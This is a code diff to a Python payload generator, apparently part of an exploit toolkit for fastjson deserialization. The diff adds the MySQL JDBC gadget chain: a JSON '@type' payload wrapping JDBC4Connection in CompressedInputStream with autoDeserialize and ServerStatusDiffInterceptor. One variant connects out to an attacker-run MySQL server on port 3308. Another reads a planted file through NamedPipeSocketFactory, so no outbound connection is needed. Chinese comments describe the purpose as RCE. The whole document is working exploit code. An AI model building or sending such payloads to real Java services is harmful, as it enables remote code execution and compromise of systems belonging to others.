@@ -228,21 +228,52 @@ def build_mysql_jdbc(
     host: str = "127.0.0.1",
     port: int = 3308,
     user: str = "fj1280",
+    *,
+    outbound: bool = True,
+    named_pipe_path: str = "/tmp/mysql.pcap",
 ) -> str:
-    """保留直连形态（非写文件步骤）；RCE 证明见 build_steps 末尾 io_write。"""
+    """CompressedInputStream → JDBC4Connection（出网 / NamedPipe 不出网）。"""
+    if outbound:
+        return (
+            "{"
+            f"{IS},"
+            '"@type":"com.mysql.jdbc.CompressedInputStream",'
+            '"conn":{'
+            '"@type":"com.mysql.jdbc.JDBC4Connection",'
+            f'"hostToConnectTo":"{_jesc(host)}",'
+            f'"portToConnectTo":{int(port)},'
+            '"info":{'
+            f'"user":"{_jesc(user)}",'
+            '"password":"pass",'
+            '"statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",'
+            '"autoDeserialize":"true",'
+            '"NUM_HOSTS":"1"'
+            "},"
+            '"databaseToConnectTo":"dbname"'
+            "}"
+            "}"
+        )
     return (
         "{"
+        f"{IS},"
+        '"@type":"com.mysql.jdbc.CompressedInputStream",'
+        '"conn":{'
         '"@type":"com.mysql.jdbc.JDBC4Connection",'
-        f'"hostToConnectTo":"{_jesc(host)}",'
-        f'"portToConnectTo":{int(port)},'
-        '"databaseToConnectTo":"dbname",'
-        '"url":"",'
+        '"hostToConnectTo":"127.0.0.1",'
+        '"portToConnectTo":3306,'
         '"info":{'
+        '"useSSL":"false",'
         f'"user":"{_jesc(user)}",'
-        '"password":"pass",'
+        f'"HOST":"{_jesc(host)}",'
         '"statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",'
         '"autoDeserialize":"true",'
-        '"NUM_HOSTS":"1"'
+        '"NUM_HOSTS":"1",'
+        '"socketFactory":"com.mysql.jdbc.NamedPipeSocketFactory",'
+        f'"namedPipePath":"{_jesc(named_pipe_path)}",'
+        '"DBNAME":"test"'
+        "},"
+        '"databaseToConnectTo":"test",'
+        '"url":""'
         "}"
         "}"
     )
@@ -325,6 +356,8 @@ def build_steps(
     user: Optional[str] = None,
     socket_factory_arg: Optional[str] = None,
     classpath: Optional[str] = None,
+    outbound: bool = True,
+    named_pipe_path: Optional[str] = None,
 ) -> list[str]:
     del guess_byte  # unused
     entry = get_gadget(gadget)
@@ -358,10 +391,16 @@ def build_steps(
             ),
         ]
     if gid == "mysql_jdbc":
+        pipe_host = host or ("xxx" if not outbound else "127.0.0.1")
         return [
             *cache,
-            build_mysql_cache_conn(),
-            build_io_write(fpath, body),
+            build_mysql_jdbc(
+                pipe_host,
+                3308 if port is None else port,
+                user or ("mysql" if not outbound else "fj1280"),
+                outbound=outbound,
+                named_pipe_path=named_pipe_path or "/tmp/mysql.pcap",
+            ),
         ]
     if gid == "groovy":
         return [
